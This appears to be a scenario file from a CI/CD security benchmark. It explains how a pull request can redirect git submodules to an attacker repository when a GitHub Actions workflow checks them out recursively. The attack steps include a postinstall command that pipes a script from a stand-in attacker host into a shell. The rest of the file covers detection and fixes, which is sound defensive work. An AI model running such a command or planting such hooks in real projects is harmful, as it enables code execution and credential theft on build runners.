# Scenario 38: recursive submodule checkout from PR

**OWASP CICD-SEC mapping:** CICD-SEC-3 (Dependency Chain Abuse),
CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-38-submodule-trust-from-pr.yml`](../../.github/workflows/scenario-38-submodule-trust-from-pr.yml)

## The pattern

```yaml
- uses: actions/checkout@v4
  with:
    submodules: recursive   # or `true`
- run: make build           # or `npm ci`, `cargo build`, etc.
```

The default `pull_request` trigger checks out the PR head ref —
including its `.gitmodules` file. With `submodules: recursive`, the
checkout action then clones whatever URLs `.gitmodules` lists, and
their nested submodules, and so on.

A contributor opening a PR can:

- Re-point an existing submodule's URL to an attacker-controlled
  repo they own.
- Add a new submodule pointing at an attacker repo.
- Pin an existing submodule to a malicious commit they've pushed
  to that submodule's repo.

Any build step that follows touches the workspace, and if any
submodule contains a `package.json` with a `postinstall` script, a
`Makefile`, a `Cargo.toml` with a `build.rs`, or a `setup.py` —
those execute against the runner under the workflow's permissions.

## How an attacker exploits it

1. Fork the target repo.
2. In the fork, edit `.gitmodules` to swap a submodule URL to
   `https://github.com/attacker/vendor-name.git` (looks plausible
   in a `git diff` — submodule URL changes are common in PRs that
   update vendored deps).
3. The attacker-controlled `vendor-name` repo contains a
   `package.json` whose `postinstall` runs:
   ```bash
   curl -sSf https://attacker.tld/x.sh | sh
   ```
4. Open a PR against the target repo. The vulnerable workflow runs
   `actions/checkout` with `submodules: recursive`, pulls the
   attacker submodule, and the next `npm ci` step runs the
   postinstall.

Note: `pull_request` (not `pull_request_target`) doesn't expose the
main repo's secrets — but the runner's `GITHUB_TOKEN`, cache,
network egress, and any committed credentials in `.env*` files are
all reachable. And if any later step in the same job pushes results
back to the repo (test reports, coverage badges) under the GITHUB_TOKEN,
those writes are now attacker-controlled.

If the trigger were `pull_request_target` instead, full secrets
exfil is on the table — same shape as scenarios 01 / 07.

## Expected scanner coverage

| Scanner | Detection |
|---|---|
| _all 7_ | ❌ — none of the scanners in this comparison currently inspect `submodules: true` / `recursive` paired with PR triggers |

A reasonable next-generation rule shape: pair `actions/checkout`
with `submodules: <true|recursive>` and any non-trivial `run:` /
`uses:` step in the same job. The recursive flag alone is a strong
signal that the workflow trusts arbitrary URLs in the PR head's
`.gitmodules`.

## Fix

Pick one:

- **Don't recurse submodules in PR-triggered builds.** Most projects
  can drop `submodules: recursive` entirely:

  ```yaml
  - uses: actions/checkout@v4
    # no submodules: line — default is `false`
  ```

- **Pin submodule commits AND restrict the URLs to your own org.**
  Even with submodules enabled, you can `git config -f .gitmodules
  --get-regexp 'submodule\..*\.url'` in CI to assert the URLs
  haven't drifted from an allowlist:

  ```yaml
  - run: |
      expected_urls=$(cat .github/expected-submodule-urls)
      diff <(git config -f .gitmodules --get-regexp 'submodule\..*\.url') \
           "$expected_urls"
  ```

- **Run the build in a sandbox** that has no network egress and no
  access to repo secrets, then promote the build outputs only after
  human review.

## References

- GitHub docs — `actions/checkout` `submodules` input:
  https://github.com/actions/checkout#usage
- "Git submodule security" — historical advisories:
  https://git-scm.com/docs/git-submodule#_security
